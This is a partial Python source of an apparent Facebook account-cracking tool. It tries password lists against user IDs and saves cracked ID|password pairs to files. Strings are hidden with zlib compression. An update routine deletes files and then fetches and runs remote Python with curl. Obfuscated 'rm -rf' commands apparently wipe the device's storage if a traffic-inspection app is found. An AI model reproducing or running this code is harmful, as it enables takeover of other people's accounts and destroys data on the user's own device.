...
try:
        jsck=open(zlib.decompress(b'x\x9c\xd3K\xcf,\xd1O\xce\xcfK\xcbL\x07\x00\x17E\x04\x18'),'r').read()
except:
        exit()
if kkk in jsck:
        pass
        ...
        exit()
os.system('xdg-open https://www.facebook.com/Asifmax01')
...
def chk():
        urll=requests.get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7OJL\xce\xc87400\xd4K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd270\xd7/M\xd4\xcb(\xc9\xcd\x01\x00i\xe2\x0f\x03')).text
        ua=('[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]')
        if ua not in urll:
                pass
        else:
                if kex in requests.get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7O,((\xabH\xd1K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd274\xd4\x07\x8ag\x94\xe4\xe6\x00\x00U\xba\x0e\xd8')).text:
                        print(' Wair for AKING New update ');exit()
                else:
...
try:
        print('\n Checking updates...')
        linx=requests.get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4\xf6\xf4s744\x800t\x03\x82\xfc\xf5s\x133\xf3\xf4\xcbR\x8b\x8a3\xf3\xf3\xf4J*J\x00d\xcd\x18g')).text
        updt = str('1.9.7')
        if updt in linx:
                pass
        else:
                print('\n AKING-PRO Update Done Wait for installing...\n')
                os.system('cd $HOME && cd AKING-PRO')
                os.system('rm -rf *')
                os.system("curl -L https://raw.githubusercontent.com/AKING110/AKING-PRO/main/AKING.py -o AKING.py && python AKING.py")
...
try:
        ...
        if f'com.h{t}pc{a}y.pro' in fileee:
                print('\033[1;37m[Ã—] First uninstall HttpCanary Apk for run tools ')
                os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
                os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
                os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
                exit()
...
----------------------------------------------
 Author    : ASIF HOSSAIN ASHIQ
 Github    :  GITHUB NOT AVAILABLE 
 Facebook  : ASIF HOSSAIN
 Tool Name : AS1F- R
 Tool type : PREMIUM 
----------------------------------------------
 For Haters: Tumko Waqat Nehi Hai AS1F ko sath panga larne ka🤙
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def menu():
        try:
                ...
                if kex in link:
                        ...
                        linex()
                        tks = ("Hi AS1F Sir, I Need To Buy Your Paid KING PRO Tools Version 1.9.7 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def gmail():
                ...
                linex()
                input(' Press enter to back ')
                os.system('python AS1F.py')
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [AS1F-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                open('/sdcard/AS1F-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Asif:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [ASIF-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AS1F-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [AS1F-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AKING-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[AS1F-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/Asif-cp.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [AS1F-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AS1F-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
